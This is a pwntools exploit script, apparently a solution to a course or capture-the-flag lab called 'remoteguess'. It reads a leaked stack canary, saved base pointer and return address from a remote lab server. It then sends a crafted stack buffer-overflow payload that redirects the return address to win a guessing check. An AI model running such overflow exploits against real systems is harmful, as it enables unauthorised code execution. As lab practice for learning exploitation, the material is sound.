#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver" if len(sys.argv) < 2 else sys.argv[1]

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')


canary = r.recvuntil(b'canary=')
canary = r.recvline(keepends=False).decode()
rbp = r.recvuntil(b'rbp=')
rbp = r.recvline(keepends=False).decode()
return_address = r.recvuntil(b'return address=')
return_address = r.recvline(keepends=False).decode() 

print("canary =          {}".format(canary))
print("rbp =             {}".format(rbp))
print("return address =  {}".format(return_address))
print("--------------------------")

myguess = 1234
canary = int(canary, 16)
rbp = int(rbp, 16)
return_address = int(return_address, 16) + 0xab

ans = str(myguess).encode('ascii').ljust(24, b'\0')
ans += p64(canary)
ans += p64(rbp)
ans += p64(return_address)
ans += b'\0' * 12
ans += p32(myguess)

print("canary =          {}".format(p64(canary)))
print("rbp =             {}".format(p64(rbp)))
print("return address =  {}".format(p64(return_address)))
print("myguess =         {}".format(p32(myguess)))
print("ans =             {}".format(ans))

r.sendafter(b'answer?', ans)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
